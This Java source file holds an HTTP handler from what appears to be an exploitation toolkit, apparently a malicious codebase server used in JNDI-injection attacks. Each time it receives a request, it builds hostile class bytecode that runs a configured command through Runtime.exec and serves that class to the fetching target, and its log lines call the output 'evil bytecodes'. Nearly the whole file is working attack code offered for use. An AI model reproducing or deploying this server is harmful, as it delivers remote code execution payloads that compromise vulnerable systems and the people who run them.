package server.http.handler;

import asm.SimExecObjectFactory;
import asm.context.ASMContext;
import cli.Config;
import com.sun.net.httpserver.HttpExchange;

import java.io.IOException;
import java.io.OutputStream;
import java.time.LocalTime;

/**
 * the handler for executing simple command
 * Runtime.getRuntime().exec(...)
 */
public class SimHandler implements CodeBase {

    public SimHandler() {
        System.out.println("[HTTP] register codebase /Sim.class");
    }

    @Override
    public void handle(HttpExchange exchange) throws IOException {
        String method = exchange.getRequestMethod();
        System.out.printf("[HTTP] %s %s - /Sim.class\n", LocalTime.now().toString(), method);

        byte[] bytes = new ASMContext(new SimExecObjectFactory()).executeOF();
        System.out.printf("[HTTP] compiled evil bytecodes Sim.class >> execute simple command '%s'\n", Config.getGlobalInstance().command);
        exchange.sendResponseHeaders(200, 0);
        OutputStream out = exchange.getResponseBody();
        out.write(bytes);
        out.flush();
        out.close();
    }
}
